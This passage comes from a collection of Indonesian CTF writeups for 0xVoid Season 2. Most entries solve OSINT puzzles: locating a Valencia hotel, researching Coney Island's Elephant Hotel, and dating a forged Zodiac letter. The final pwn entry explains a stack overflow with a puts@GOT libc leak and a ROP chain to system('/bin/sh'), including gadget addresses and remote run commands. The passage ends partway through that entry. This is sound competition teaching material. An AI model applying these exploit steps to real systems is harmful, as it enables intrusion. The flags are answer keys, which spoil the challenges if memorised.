        "content": "Bangunan putih besar pada sisi kanan gambar menjadi landmark utama.\n\nCiri-cirinya:\n\n```text\n- large white façade\n- classical columns\n- symmetrical architecture\n- corner pavilion/tower\n- directly beside a palm-lined coastal road\n```\n\nSetelah membandingkan landmark hotel dan bangunan bersejarah di kawasan pesisir Spanyol, bangunan tersebut cocok dengan:\n\n```text\nHotel Balneario Las Arenas\nLas Arenas Balneario Resort\nValencia, Spain\n```\n\nSitus resmi hotel mencantumkan lokasinya di:\n\n```text\nEugenia Viñes, 22–24\n46011 Valencia\nSpain\n```\n\nThe Leading Hotels of the World juga mencantumkan Hotel Las Arenas pada alamat yang sama di Valencia.\n\n---"
      },
      {
        "title": "4. Maritime Clue Confirmation",
        "content": "Clue pada challenge menggunakan kata:\n\n```text\nmaritime views\n```\n\nHal ini ternyata sangat relevan.\n\nLas Arenas Balneario Resort memang berada di kawasan pantai Valencia. Sumber hotel/travel menyebut properti tersebut berada di **Las Arenas Beach**, sementara informasi akomodasi juga mencatat lokasinya berada di kawasan **Poblats Marítims**.\n\nDengan demikian kita memiliki beberapa kecocokan sekaligus:\n\n```text\nChallenge image\n      │\n      ├── Maritime environment\n      ├── Palm trees\n      ├── Wide coastal boulevard\n      ├── Large classical white building\n      │\n      ▼\nHotel Balneario Las Arenas\n      │\n      ▼\nValencia, Spain\n```\n\n---"
      },
      {
        "title": "5. Street-Level Verification",
        "content": "Setelah landmark ditemukan, tahap berikutnya adalah mencocokkan lingkungan di sekitar hotel dengan challenge image.\n\nBeberapa elemen yang harus diperhatikan:\n\n### A. Hotel façade\n\nBangunan berada tepat di sisi jalan dan memiliki façade putih monumental.\n\n### B. Palm trees\n\nTerdapat jajaran pohon palem di median dan sisi jalan.\n\n### C. Road orientation\n\nSudut pengambilan gambar menunjukkan kamera berada pada boulevard yang melewati bagian depan kompleks Las Arenas.\n\n### D. Maritime district\n\nHotel berada dekat pantai sehingga konsisten dengan petunjuk challenge mengenai *maritime views*.\n\nDengan kombinasi clue tersebut, titik dapat dipersempit ke jalan tepat di depan Hotel Las Arenas di Valencia.\n\n---"
      },
      {
        "title": "6. Coordinate Extraction",
        "content": "Setelah lokasi ditemukan, titik Street View/geolocation diperiksa di sekitar:\n\n```text\nHotel Las Arenas\nEugenia Viñes\nValencia, Spain\n```\n\nKoordinat berada pada kisaran:\n\n```text\nLatitude  ≈ 39.466\nLongitude ≈ -0.324\n```\n\nChallenge hanya meminta tiga angka desimal:\n\n```text\nxx.xxx,xx.xxx\n```\n\nSehingga coordinate pair yang digunakan oleh challenge adalah:\n\n```text\n39.466,-0.324\n```\n\n---"
      },
      {
        "title": "7. Important Precision Note",
        "content": "Pada challenge geolocation, koordinat landmark dan posisi kamera dapat berbeda beberapa meter.\n\nArtinya, jangan hanya mengambil koordinat pusat bangunan.\n\nYang dicari sebaiknya adalah:\n\n```text\ncamera position / road position\n```\n\nbukan:\n\n```text\nhotel building centroid\n```\n\nHal ini penting karena perbedaan beberapa puluh meter dapat mengubah digit ketiga desimal.\n\nDalam challenge ini, coordinate pair yang terbukti diterima oleh checker adalah:\n\n```text\n39.466,-0.324\n```\n\n---"
      },
      {
        "title": "8. Flag Construction",
        "content": "Coordinate:\n\n```text\n39.466,-0.324\n```\n\nMasukkan ke format challenge:\n\n```text\n0xV01D{LATITUDE,LONGITUDE}\n```\n\nHasil:\n\n```text\n0xV01D{39.466,-0.324}\n```\n\n---"
      },
      {
        "title": "OSINT Tracker",
        "content": "| #  | Investigation            | Method / Query                 | Result                              | Status |\n| -- | ------------------------ | ------------------------------ | ----------------------------------- | ------ |\n| 1  | Analisis lingkungan      | Visual inspection              | Coastal / maritime urban area       | ✅      |\n| 2  | Identifikasi iklim       | Vegetation + architecture      | Mediterranean region                | ✅      |\n| 3  | Cari negara              | Road + architecture comparison | Spain                               | ✅      |\n| 4  | Landmark utama           | Analisis bangunan putih        | Luxury / historic coastal hotel     | ✅      |\n| 5  | Identifikasi bangunan    | Landmark comparison            | Hotel Balneario Las Arenas          | ✅      |\n| 6  | Verifikasi alamat        | Official hotel website         | Eugenia Viñes 22–24, Valencia       | ✅      |\n| 7  | Verifikasi maritime clue | Location research              | Las Arenas Beach / Poblats Marítims | ✅      |\n| 8  | Cocokkan jalan           | Street-level surroundings      | Palm-lined road cocok               | ✅      |\n| 9  | Cari posisi kamera       | Map / Street View inspection   | Depan Hotel Las Arenas              | ✅      |\n| 10 | Ekstrak latitude         | Coordinate inspection          | `39.466`                            | ✅      |\n| 11 | Ekstrak longitude        | Coordinate inspection          | `-0.324`                            | ✅      |\n| 12 | Submit flag              | Challenge checker              | Accepted                            | ✅      |\n\n---"
      },
      {
        "title": "Investigation Flow",
        "content": "```text\nChallenge Image\n      │\n      ▼\nVisual Recon\n      │\n      ├── Palm trees\n      ├── Mediterranean weather\n      ├── Coastal boulevard\n      └── Distinctive white building\n      │\n      ▼\nSearch Mediterranean Coastal Cities\n      │\n      ▼\nSpain\n      │\n      ▼\nValencia\n      │\n      ▼\nIdentify White Building\n      │\n      ▼\nHotel Balneario Las Arenas\n      │\n      ▼\nVerify Address + Beach Location\n      │\n      ▼\nInspect Street Position\n      │\n      ▼\n39.466, -0.324\n      │\n      ▼\n0xV01D{39.466,-0.324}\n```\n\n---\n\n\n**Flag:**\n\n```text\n0xV01D{39.466,-0.324}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV0ID{xx.xxx,xx.xxx}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-osint-theelephantinthearchive",
    "title": "The Elephant in the Archive",
    "category": "OSINT",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge The Elephant in the Archive",
    "problemDescription": "",
    "tools": [],
    "analysis": "### 7. Menentukan Public School\n\nBerikutnya challenge meminta:\n\n> The public school number currently near the historical site, normalized as `psNN`.\n\nKita perlu mencari posisi historis Elephantine Colossus dan membandingkannya dengan lokasi modern.\n\nPencarian:\n\n`Elephant Hotel Coney Island PS 90`\n\nmenghasilkan halaman dari **Coney Island History Project**.\n\nMereka menjelaskan bahwa hotel berbentuk gajah tersebut dahulu berada **di seberang lokasi sekolah yang sekarang menjadi P.S. 90** di West 12th Street.\n\nSelanjutnya informasi sekolah diverifikasi menggunakan sumber resmi **New York City Public Schools**.\n\nSekolah tersebut adalah:\n\n**P.S. 90 Edna Cohen School**\n\ndengan:\n\n* School Number: `K090`\n* Address: `2840 West 12 Street, Brooklyn, NY 11224`\n\nChallenge meminta normalisasi sebagai:\n\n`psNN`\n\nJadi `P.S. 90` menjadi:\n\n**Token #4**\n\n`ps90`\n\n---\n\n### 8. Menentukan Tanggal Kebakaran\n\nBagian terakhir meminta:\n\n> The fire date itself as YYYYMMDD, not the next day's newspaper date.\n\nEvidence bahkan memberikan warning:\n\n> `EVENT DATE != REPORT DATE.`\n\nIni menunjukkan bahwa mengambil tanggal pada header surat kabar secara langsung akan menghasilkan jawaban salah.\n\nPencarian arsip koran melalui Library of Congress menghasilkan berita mengenai kebakaran Elephantine Colossus.\n\nBerita tersebut memiliki dateline:\n\n**September 28**\n\ntetapi teks laporan mengatakan Elephant Coney Island telah hancur oleh kebakaran **late last night**.\n\nArtinya:\n\n* Report date = 28 September 1896\n* Fire/event date = malam sebelumnya\n* Event date = **27 September 1896**\n\nHal tersebut dapat diverifikasi secara independen melalui situs resmi Lucy the Elephant, yang menyatakan bahwa Elephantine Colossus terbakar pada **Sunday evening, September 27, 1896**.\n\nFormat yang diminta:\n\n`YYYYMMDD`\n\nmenjadi:\n\n**Token #5**\n\n`18960927`\n\n---",
    "solution": [
      {
        "title": "Challenge",
        "content": "**Category:** OSINT\n**Challenge:** The Elephant in the Archive\n\nDiberikan sebuah gambar `evidence.png` yang menampilkan bangunan berbentuk gajah beserta beberapa petunjuk:\n\n* `CASE FILE 1896`\n* `NOT A STATUE. PEOPLE ENTERED IT.`\n* `31 / 63 / 25`\n* `One sibling survives. Two vanished.`\n* `A contemporary count conflicts with a descendant's retelling.`\n* `SEARCH THE OPEN WEB. TRUST PRIMARY PAGES. EVENT DATE != REPORT DATE.`\n\nKita diminta mendapatkan lima nilai:\n\n1. Nomor paten enam digit.\n2. Nama satu ruangan persis seperti yang tercetak dalam tourist guide tahun 1887.\n3. Jumlah **full working days** menurut guide 1887.\n4. Nomor public school yang saat ini berada dekat lokasi historis.\n5. Tanggal kebakaran sebenarnya, bukan tanggal koran memberitakannya.\n\nFormat flag:\n\n`0xV01D{patent_room_days_school_yyyymmdd}`\n\n---"
      },
      {
        "title": "1. Mengidentifikasi Bangunan",
        "content": "Petunjuk pertama yang paling kuat adalah gambar bangunan berbentuk **gajah raksasa**.\n\nTulisan:\n\n> `NOT A STATUE. PEOPLE ENTERED IT.`\n\nmenunjukkan bahwa objek tersebut bukan patung, tetapi bangunan yang dapat dimasuki.\n\nPencarian awal dapat menggunakan query:\n\n`1896 elephant shaped building Coney Island`\n\natau:\n\n`elephant hotel burned 1896`\n\nHasil pencarian mengarah ke **Elephantine Colossus**, yang juga dikenal sebagai **Elephant Hotel**, sebuah bangunan berbentuk gajah di Coney Island, New York.\n\nPetunjuk:\n\n`One sibling survives. Two vanished.`\n\njuga cocok dengan sejarah struktur karya **James V. Lafferty**. Situs resmi Lucy the Elephant menjelaskan bahwa terdapat tiga struktur gajah yang berkaitan dengan desain Lafferty dan **Lucy the Elephant adalah satu-satunya yang masih utuh**. Dua struktur lainnya adalah Light of Asia dan Elephantine Colossus.\n\nDengan demikian target challenge dapat diidentifikasi sebagai:\n\n**Elephantine Colossus / Elephant Hotel — Coney Island**\n\n---"
      },
      {
        "title": "2. Mencari Nomor Paten",
        "content": "Challenge meminta:\n\n> The six-digit US patent number for the animal-shaped building idea.\n\nQuery yang digunakan:\n\n`James V Lafferty elephant building patent`\n\nSumber yang sangat kuat ditemukan di **U.S. National Archives**.\n\nNational Archives menjelaskan bahwa James V. Lafferty memperoleh paten untuk bangunan berbentuk hewan tersebut pada 5 Desember 1882 dengan nomor:\n\n**Patent No. 268,503**.\n\nKarena format challenge meminta enam digit tanpa tanda baca:\n\n**Token #1**\n\n`268503`\n\n---"
      },
      {
        "title": "3. Menemukan Tourist Guide Tahun 1887",
        "content": "Challenge secara spesifik meminta informasi dari:\n\n> the 1887 tourist guide\n\nPencarian terhadap sumber tersebut menghasilkan buku:\n\n**J. Perkins Tracy — The Tourists Companion and Guide to Coney Island, Fort Hamilton, Bath Beach, Sheepshead Bay, Rockaway Beach and Far Rockaway**\n\nBuku tersebut diterbitkan oleh Austin Publishing Company pada **1887**. Salinan digital Google Books berasal dari koleksi Princeton University.\n\nHathiTrust juga mencatat edisi yang sama sebagai terbitan tahun 1887 dengan akses full-view yang berasal dari Library of Congress.\n\nBagian inilah yang menjadi kunci utama challenge karena kita harus mempercayai **sumber sezaman**, bukan retelling modern.\n\n---"
      },
      {
        "title": "4. Room Name — Jebakan `through` vs `trough`",
        "content": "Pada bagian deskripsi ruangan Elephantine Colossus terdapat daftar berbagai kamar.\n\nDi antara daftar tersebut tercetak:\n\n`1 through room from which the Elephant is feeding`\n\nEjaan yang secara intuitif terasa benar adalah **trough**, karena *trough* berarti tempat makan hewan.\n\nTetapi challenge mengatakan:\n\n> Preserve the printed spelling.\n\nArtinya kita tidak diperbolehkan memperbaiki typo atau ejaan aneh dari sumber asli.\n\nTranskripsi lain dari daftar kamar yang sama juga mempertahankan bentuk:\n\n`1 through room from which the Elephant is feeding.`\n\nJadi nilai yang harus digunakan adalah:\n\n**Token #2**\n\n`through`\n\nBukan:\n\n`trough`\n\nIni merupakan salah satu jebakan utama challenge.\n\n---"
      },
      {
        "title": "5. Full Working Days — Jebakan `129` vs `120`",
        "content": "Ini merupakan bagian tersulit dari challenge.\n\nPada awalnya, sumber modern yang sangat meyakinkan memberikan angka:\n\n**129 full working days**\n\nSitus resmi Lucy the Elephant menyebut bahwa Elephantine Colossus membutuhkan **263 pekerja dan 129 full working days** untuk diselesaikan. Situs tersebut juga menyebut 31 ruangan, 65 jendela, dan 25 lampu listrik.\n\nNamun challenge memberikan clue:\n\n> `A contemporary count conflicts with a descendant's retelling.`\n\nKata **contemporary** menunjukkan kita harus menggunakan sumber yang berasal dari periode ketika Elephantine Colossus masih berdiri.\n\nKarena itu sumber modern tidak boleh langsung dipercaya.\n\nSaat scan guide tahun **1887** diperiksa langsung, terdapat kalimat:\n\n> `It took 263 men 120 full working days to build it`\n\nDengan demikian angka di sumber sezaman adalah:\n\n**120**\n\nbukan:\n\n**129**\n\nScan halaman yang digunakan saat investigasi dapat dilihat di sini:\n\n[Scan guide 1887](sandbox:/mnt/data/guide_render/page33.png)\n\nHal ini menjelaskan maksud clue tentang konflik antara **contemporary count** dan **descendant's retelling**.\n\nSumber modern Lucy memberikan `129`, sedangkan guide sezaman tahun 1887 memberikan `120`.\n\nMaka:\n\n**Token #3**\n\n`120`\n\n---"
      },
      {
        "title": "6. Memahami Clue `31 / 63 / 25`",
        "content": "Evidence image juga menampilkan:\n\n`31 / 63 / 25`\n\nAngka-angka tersebut ternyata bukan angka acak.\n\nGuide sezaman menggambarkan Elephantine Colossus dengan:\n\n* **31 rooms**\n* **63 windows**\n* **25 electric lights**\n\nSementara retelling modern Lucy masih menyebut 31 rooms dan 25 electric lights, tetapi memberikan angka **65 windows**, bukan 63.\n\nArtinya clue `31 / 63 / 25` sekaligus memberikan indikasi bahwa pembuat challenge mengharapkan kita kembali ke **sumber historis asli**, bukan hanya mengambil angka dari halaman sejarah modern.\n\nIni juga memperkuat bahwa angka `120` dari guide 1887 adalah nilai yang harus digunakan.\n\n---"
      },
      {
        "title": "9. Penyusunan Flag",
        "content": "Semua token yang berhasil dikumpulkan:\n\n| Field             | Value      |\n| ----------------- | ---------- |\n| Patent            | `268503`   |\n| Room              | `through`  |\n| Full working days | `120`      |\n| School            | `ps90`     |\n| Fire date         | `18960927` |\n\nGabungkan mengikuti format challenge:\n\n`0xV01D{patent_room_days_school_yyyymmdd}`\n\nSehingga didapat:\n\n**FLAG**\n\n`0xV01D{268503_through_120_ps90_18960927}`\n\n---"
      },
      {
        "title": "OSINT Tracker",
        "content": "| No. | Target                    | Query / Pivot                                  | Source                       | Temuan                                                                                                                      | Token                  |\n| --- | ------------------------- | ---------------------------------------------- | ---------------------------- | --------------------------------------------------------------------------------------------------------------------------- | ---------------------- |\n| 1   | Identify building         | `1896 elephant shaped building Coney Island`   | Lucy the Elephant            | Target adalah Elephantine Colossus, salah satu dari tiga struktur gajah Lafferty.                                           | `Elephantine Colossus` |\n| 2   | Patent                    | `James V Lafferty elephant building patent`    | U.S. National Archives       | Patent No. 268,503 diberikan kepada Lafferty pada 1882.                                                                     | `268503`               |\n| 3   | Identify historical guide | `\"Tourists Companion\" Coney Island 1887 Tracy` | Google Books / HathiTrust    | Guide J. Perkins Tracy diterbitkan pada 1887.                                                                               | —                      |\n| 4   | Room label                | Inspect 1887 guide                             | 1887 guide scan              | Tercetak `through room`, bukan `trough room`.                                                                               | `through`              |\n| 5   | Construction days         | Inspect 1887 guide                             | 1887 guide scan              | Guide sezaman mencatat `120 full working days`. Modern Lucy retelling menggunakan `129`.                                    | `120`                  |\n| 6   | Numbers clue              | Compare `31 / 63 / 25`                         | 1887 guide + Lucy history    | 31 rooms / 63 windows / 25 electric lights membantu menunjukkan perbedaan dengan retelling modern yang menyebut 65 windows. | —                      |\n| 7   | Historical location       | `Elephant Hotel Coney Island PS 90`            | Coney Island History Project | Elephant Hotel dahulu berada di seberang lokasi P.S. 90.                                                                    | `ps90`                 |\n| 8   | Verify school             | `P.S. 90 West 12 Street Brooklyn`              | NYC Public Schools           | P.S. 90 Edna Cohen School / K090 berada di 2840 West 12 Street.                                                             | `ps90`                 |\n| 9   | Fire report               | `Coney Elephant burned September 1896`         | Library of Congress          | Laporan bertanggal Sept. 28 menyatakan kebakaran terjadi `late last night`.                                                 | `18960927`             |\n| 10  | Verify event date         | Search official surviving sibling history      | Lucy the Elephant            | Situs resmi menyebut Sunday evening, Sept. 27, 1896.                                                                        | `18960927`             |\n\n---"
      },
      {
        "title": "Final Flag",
        "content": "**`0xV01D{268503_through_120_ps90_18960927}`**"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV01D{patent_room_days_school_yyyymmdd}",
    "lessonsLearned": "Challenge ini memiliki beberapa jebakan OSINT yang cukup bagus.\n\n### 1. Exact transcription matters\n\nKata yang terlihat seperti typo tidak boleh langsung diperbaiki.\n\n`through` ≠ `trough`\n\nKarena challenge secara eksplisit meminta **printed spelling**, nilai yang benar tetap:\n\n`through`\n\n### 2. Primary source beats modern retelling\n\nSumber modern memberikan:\n\n`129 full working days`\n\ntetapi guide sezaman tahun 1887 memberikan:\n\n`120 full working days`\n\nClue:\n\n`A contemporary count conflicts with a descendant's retelling.`\n\nsecara langsung mengarahkan investigator untuk memilih angka dari sumber historis.\n\n### 3. Historical location requires a modern pivot\n\nBangunan sudah tidak ada sejak 1896, sehingga lokasi tidak dapat diverifikasi hanya dengan mencari bangunannya pada peta modern.\n\nPivot yang digunakan:\n\n`historic Elephant Hotel location → West 12th Street → P.S. 90 → NYC Schools`\n\nmenghasilkan:\n\n`ps90`\n\n### 4. Report date is not always event date\n\nBerita koran memiliki tanggal:\n\n`1896-09-28`\n\ntetapi isi berita mengatakan kejadian terjadi pada malam sebelumnya.\n\nKarena challenge meminta **fire date itself**, nilai yang benar adalah:\n\n`1896-09-27`\n\natau:\n\n`18960927`\n\n---"
  },
  {
    "id": "0xvoid-s2-osint-thezodiacarchive",
    "title": "The Zodiac Archive",
    "category": "OSINT",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge The Zodiac Archive",
    "problemDescription": "",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge",
        "content": "**Category:** OSINT\n**Challenge:** The Zodiac Archive\n\n> A private collector claims to possess four original letters attributed to the Zodiac Killer. Although all four appear authentic, investigators believe one contains a historical inconsistency. Examine the scans, verify the historical details using publicly available sources, and identify the forged document.\n\nFlag format:\n\n```text\n0xV0ID{YEAR_NAME}\n```\n\nFinal flag:\n\n```text\n0xV0ID{1975_BICENTENNIAL}\n```\n\n---"
      },
      {
        "title": "1. Initial Recon",
        "content": "Challenge memberikan sebuah arsip:\n\n```text\nletters.zip\n```\n\nIsi arsip dapat diperiksa menggunakan:\n\n```bash\nunzip -l letters.zip\n```\n\nHasilnya terdapat empat scan utama:\n\n```text\nletter_1.png\nletter_2.png\nletter_3.png\nletter_4.png\n```\n\nKarena challenge mengatakan keempat surat tampak autentik tetapi salah satunya memiliki **historical inconsistency**, fokus analisis bukan pada steganografi atau manipulasi file, melainkan mencari objek di dalam scan yang tidak mungkin berasal dari periode yang diklaim.\n\nKeempat dokumen mengarah pada periode **1971**. Oleh karena itu, setiap detail visual seperti perangko, tarif pos, desain, tanggal penerbitan, dan objek historis lain harus dibandingkan dengan timeline tahun tersebut.\n\n---"
      },
      {
        "title": "2. Visual Inspection",
        "content": "Saya membandingkan keempat surat secara manual.\n\nHal yang paling menarik muncul pada:\n\n```text\nletter_3.png\n```\n\nPada bagian perangkonya terdapat perangko Amerika Serikat bernilai:\n\n```text\n10¢\n```\n\nDesainnya berkaitan dengan:\n\n```text\nLexington and Concord\n1775–1975\n```\n\nTulisan **1775–1975** langsung menjadi indikator kuat.\n\nJika surat benar-benar berasal dari tahun **1971**, sebuah perangko yang secara eksplisit memperingati periode **1775–1975** sangat mencurigakan.\n\nHipotesis awal:\n\n```text\nletter_3.png menggunakan perangko yang belum diterbitkan pada 1971.\n```\n\n---"
      },
      {
        "title": "3. Identifying the Stamp",
        "content": "Pencarian difokuskan pada kombinasi ciri:\n\n```text\n10 cent\nLexington Concord\n1775\n1975\nUS postage stamp\n```\n\nPerangko tersebut berhasil diidentifikasi sebagai perangko:\n\n```text\n10c Lexington and Concord 1775\n```\n\nkoleksi Smithsonian National Postal Museum.\n\nCatatan resmi Smithsonian menyatakan tanggal perangko tersebut:\n\n```text\nApril 19, 1975\n```\n\natau:\n\n```text\n1975-04-19\n```\n\nSmithsonian juga menjelaskan bahwa perangko Lexington & Concord bernilai 10¢ tersebut diterbitkan pada **19 April 1975**, tepat pada peringatan 200 tahun Battles of Lexington and Concord.\n\nIni merupakan bukti utama.\n\nSurat mengklaim berasal dari:\n\n```text\n1971\n```\n\nsedangkan perangkonya baru ada pada:\n\n```text\n1975\n```\n\nMaka perangko tersebut berada sekitar empat tahun terlalu awal apabila benar digunakan pada surat tahun 1971.\n\n---"
      },
      {
        "title": "4. Secondary Verification — Postal Rate",
        "content": "Untuk memastikan bahwa anomali bukan sekadar kesalahan identifikasi desain, saya melakukan cross-check menggunakan riwayat tarif resmi United States Postal Service.\n\nUSPS mencatat tarif surat domestik first-class sebagai berikut:\n\n```text\nJanuary 7, 1968  -> 6¢\nMay 16, 1971     -> 8¢\nMarch 2, 1974    -> 10¢\nDecember 31, 1975 -> 13¢\n```\n\nDengan demikian, tarif **10¢** sendiri baru berlaku mulai:\n\n```text\nMarch 2, 1974\n```\n\nNational Postal Museum juga mencatat timeline yang sama: tarif domestik menjadi **8¢ pada 16 Mei 1971**, kemudian menjadi **10¢ pada 2 Maret 1974**.\n\nJadi `letter_3.png` memiliki **dua historical inconsistencies**:\n\n```text\n1. Perangko Lexington & Concord baru diterbitkan tahun 1975.\n2. Tarif first-class 10¢ sendiri baru berlaku tahun 1974.\n```\n\nKeduanya tidak cocok dengan surat yang diklaim berasal dari tahun 1971.\n\n---"
      },
      {
        "title": "5. Control Check — 1971 Postage",
        "content": "Sebagai pembanding, Smithsonian mencatat perangko **8¢ Dwight D. Eisenhower** dengan tanggal penerbitan:\n\n```text\nMay 10, 1971\n```\n\nNational Postal Museum menjelaskan bahwa ketika tarif first-class naik menjadi **8¢ pada 16 Mei 1971**, perangko Eisenhower dibuat dalam denominasi 8¢ untuk menyesuaikan tarif tersebut.\n\nHal ini memberikan baseline yang masuk akal untuk material pos dari periode 1971.\n\nNamun, yang paling penting untuk challenge ini bukan membuktikan ketiga surat lainnya asli secara absolut. Kita hanya perlu menemukan satu dokumen dengan detail yang **mustahil secara historis**, dan `letter_3.png` memenuhi kondisi tersebut secara definitif.\n\n---"
      },
      {
        "title": "6. Forged Document",
        "content": "Dokumen palsu adalah:\n\n```text\nletter_3.png\n```\n\nReason:\n\n```text\nClaimed year : 1971\nStamp        : 10¢ Lexington and Concord Bicentennial\nStamp year   : 1975\n10¢ rate     : only effective from 1974\n```\n\nTimeline sederhananya:\n\n```text\n1971\n │\n ├── Letter claims to exist here\n ├── Domestic letter rate becomes 8¢\n │\n ▼\n1974\n │\n ├── Domestic letter rate becomes 10¢\n │\n ▼\n1975\n │\n └── Lexington & Concord Bicentennial 10¢ stamp issued\n```\n\nDengan kata lain:\n\n```text\n1971 letter\n     +\n1975 commemorative stamp\n     =\nhistorical impossibility\n```\n\n---"
      },
      {
        "title": "7. Flag Construction",
        "content": "Format challenge:\n\n```text\n0xV0ID{YEAR_NAME}\n```\n\nTahun diambil dari tahun penerbitan objek yang menyebabkan anachronism:\n\n```text\n1975\n```\n\nNama yang digunakan untuk tema perangko tersebut:\n\n```text\nBICENTENNIAL\n```\n\nMaka:\n\n```text\nYEAR = 1975\nNAME = BICENTENNIAL\n```\n\nFinal flag:\n\n```text\n0xV0ID{1975_BICENTENNIAL}\n```\n\n---"
      },
      {
        "title": "OSINT Tracker",
        "content": "| #  | Target / Pertanyaan                                | Query / Metode                                   | Source                             | Evidence                                                 | Status |\n| -- | -------------------------------------------------- | ------------------------------------------------ | ---------------------------------- | -------------------------------------------------------- | ------ |\n| 1  | Berapa scan yang tersedia?                         | `unzip -l letters.zip`                           | Local artifact                     | `letter_1.png` sampai `letter_4.png`                     | ✅      |\n| 2  | Dokumen mana yang mencurigakan?                    | Visual comparison                                | Challenge scans                    | `letter_3.png` memiliki perangko 10¢ bertema `1775–1975` | ✅      |\n| 3  | Apa identitas perangkonya?                         | Cari `10 cent Lexington Concord 1775 1975 stamp` | Smithsonian National Postal Museum | `10c Lexington and Concord 1775`                         | ✅      |\n| 4  | Kapan perangko tersebut diterbitkan?               | Smithsonian object record                        | National Postal Museum             | **19 April 1975**                                        | ✅      |\n| 5  | Apakah perangko itu peringatan Bicentennial?       | Smithsonian historical page                      | National Postal Museum             | Diterbitkan pada 200th anniversary Lexington & Concord   | ✅      |\n| 6  | Berapa tarif surat domestik tahun 1971?            | USPS postal history                              | USPS                               | **8¢ mulai 16 Mei 1971**                                 | ✅      |\n| 7  | Kapan tarif menjadi 10¢?                           | USPS postal history                              | USPS                               | **2 Maret 1974**                                         | ✅      |\n| 8  | Apakah 10¢ valid untuk surat 1971?                 | Timeline comparison                              | USPS                               | Tidak; tarif tersebut belum berlaku                      | ✅      |\n| 9  | Apakah perangko Lexington-Concord valid pada 1971? | Issue-date comparison                            | Smithsonian                        | Tidak; perangko baru terbit tahun 1975                   | ✅      |\n| 10 | Forged document                                    | Evidence correlation                             | All evidence                       | `letter_3.png`                                           | ✅      |\n| 11 | Flag year                                          | Stamp issue date                                 | Smithsonian                        | `1975`                                                   | ✅      |\n| 12 | Flag name                                          | Stamp theme                                      | Smithsonian / challenge convention | `BICENTENNIAL`                                           | ✅      |\n| 13 | Final flag                                         | Assemble `YEAR_NAME`                             | Challenge format                   | `0xV0ID{1975_BICENTENNIAL}`                              | ✅      |\n\n---"
      },
      {
        "title": "Evidence Chain",
        "content": "```text\nletters.zip\n    │\n    ├── letter_1.png\n    ├── letter_2.png\n    ├── letter_3.png  <── suspicious\n    └── letter_4.png\n             │\n             ▼\n    10¢ Lexington & Concord\n        \"1775–1975\"\n             │\n             ▼\n Smithsonian verification\n             │\n             ├── Issue date: April 19, 1975\n             │\n             ▼\n      USPS rate history\n             │\n             ├── 1971 = 8¢\n             └── 1974 = 10¢\n             │\n             ▼\n       Anachronism confirmed\n             │\n             ▼\n       Forgery = letter_3\n             │\n             ▼\n0xV0ID{1975_BICENTENNIAL}\n```\n\n---"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV0ID{YEAR_NAME}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-pwn-ropcsu",
    "title": "q2 — RopCSU",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge q2 — RopCSU",
    "problemDescription": "Binary hanya menyediakan `puts` dan `read`. Tidak ada `win()`, jadi exploit memakai dua tahap: leak alamat libc lewat `puts@GOT`, lalu memanggil `system(\"/bin/sh\")` dari libc.",
    "tools": [],
    "analysis": "Fungsi utama berada di `0x401090`. Alurnya:\n\n```asm\n0x401090: sub rsp, 0x58\n...\n0x4010c2: lea rdi, [rip+0xf3f]   ; banner\n0x4010c9: call puts@plt\n0x4010ce: mov rsi, rsp\n0x4010d1: mov edx, 0x200\n0x4010d8: xor edi, edi\n0x4010da: call read@plt\n0x4010df: add rsp, 0x58\n0x4010e3: ret\n```\n\n`read()` menulis maksimal `0x200` byte ke buffer yang hanya menyediakan `0x58` byte sebelum saved return address. Tidak ada canary, sehingga saved RIP dapat ditimpa.\n\n### Vulnerability dan Offset\n\nOffset RIP adalah `0x58`. Ini sesuai langsung dengan ukuran stack frame (`sub rsp, 0x58`) dan terbukti lewat payload overflow lokal yang berhasil mengarahkan eksekusi ke gadget ROP.\n\nPrimitive yang terbukti:\n\n- arbitrary control-flow lewat saved RIP pada offset `0x58`;\n- arbitrary read terbatas melalui `puts(puts@GOT)`;\n- pemanggilan fungsi libc setelah base libc diketahui.",
    "solution": [
      {
        "title": "Proteksi Binary",
        "content": "Hasil `file` dan `checksec`:\n\n```text\nELF 64-bit LSB executable, x86-64, dynamically linked, stripped\nRELRO: Partial RELRO\nStack: No canary found\nNX: NX enabled\nPIE: No PIE (0x400000)\nSHSTK: Enabled\nIBT: Enabled\n```\n\nBinary memakai `libc.so.6` yang disediakan challenge. Karena PIE nonaktif, alamat gadget dan GOT binary tetap."
      },
      {
        "title": "Strategi Exploit",
        "content": "Binary memiliki gadget `pop rdi; ret` tersembunyi di rangkaian CSU pada `0x4011ed`. Entry PLT `puts` yang benar adalah `0x401060`; `0x401064` adalah instruksi internal setelah `endbr64` dan menyebabkan crash bila dipakai sebagai target ROP.\n\nTahap pertama:\n\n```text\npadding 0x58\npop rdi; ret\nputs@GOT\nputs@PLT\nmain (0x401090)\n```\n\n`puts` mencetak isi GOT yang berisi alamat runtime `puts` di libc. Setelah return ke main, program membaca payload kedua.\n\nTahap kedua:\n\n```text\npadding 0x58\nret                 ; alignment stack untuk libc\npop rdi; ret\nalamat \"/bin/sh\"\nalamat system\n```\n\nBase libc dihitung dengan:\n\n```text\nlibc_base = leaked_puts - libc.sym[\"puts\"]\n```\n\nAlamat `/bin/sh` dan `system` kemudian diambil relatif terhadap base tersebut. Tidak ada alamat libc yang di-hardcode."
      },
      {
        "title": "Exploit Final",
        "content": "Script lengkap ada di [`solve.py`](./solve.py). Mode yang tersedia:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py\npython3 solve.py GDB\npython3 solve.py REMOTE HOST=35.192.106.100 PORT=20002\n```\n\nMode lokal memakai `libc.so.6` di direktori challenge melalui `LD_LIBRARY_PATH`. Mode remote memakai leak runtime dari service lalu menghitung base secara dinamis."
      },
      {
        "title": "Validasi",
